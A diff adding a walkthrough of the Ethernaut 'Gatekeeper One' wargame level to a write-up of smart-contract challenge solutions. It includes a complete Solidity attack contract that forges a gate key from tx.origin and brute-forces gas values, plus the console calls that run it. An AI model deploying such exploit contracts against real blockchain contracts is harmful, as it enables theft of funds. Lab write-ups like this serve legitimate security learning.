@@ -709,3 +709,73 @@ This confirmed that the level was successfully completed.
 
 ## Level Completed
 ![Level Complete Output](assets/Privacy.png)
+
+
+# Ethernaut Level 4: Gatekeeper One
+
+## Strategy
+
+- **Vulnerability**: The contract has three tricky gates:
+  1. **Gate One** requires the `msg.sender` to be different from `tx.origin`, meaning we must call it through a contract.
+  2. **Gate Two** requires `gasleft() % 8191 == 0`. This needs brute-forcing different gas values.
+  3. **Gate Three** involves carefully crafting a `bytes8` key that matches three constraints involving the caller's address and bit-level properties.
+
+- **Exploit**: I created an attacking contract to:
+  - Satisfy Gate One by calling the function through a contract.
+  - Brute-force the gas for Gate Two.
+  - Generate a key that satisfies all parts of Gate Three.
+
+---
+
+## Commands Used
+
+### 1. Deploy the attack contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperOneHack {
+    function attack(address target) public {
+        bytes8 key = bytes8(
+            uint64(uint16(uint160(tx.origin))) | (uint64(1) << 32)
+        );
+
+        for (uint256 i = 0; i < 300; i++) {
+            (bool success, ) = target.call{gas: 8191 * 3 + i}(
+                abi.encodeWithSignature("enter(bytes8)", key)
+            );
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+```
+This attack contract automates the solution to all three gates by constructing a valid key and looping through gas values.
+
+---
+
+### 2. Call the attack function
+```
+await attacker.attack(contract.address)
+```
+This executes the attack on the `GatekeeperOne` contract instance, attempting to register my address as the `entrant`.
+
+---
+
+### 3. Confirm level completion
+```
+await contract.entrant()
+```
+**Output**: My wallet address (tx.origin)
+
+If the value returned is the wallet address, then we've have successfully passed all gates and completed the level.
+
+---
+
+## Level Completed
+![Level Complete Output](assets/gatekeeper1.png)
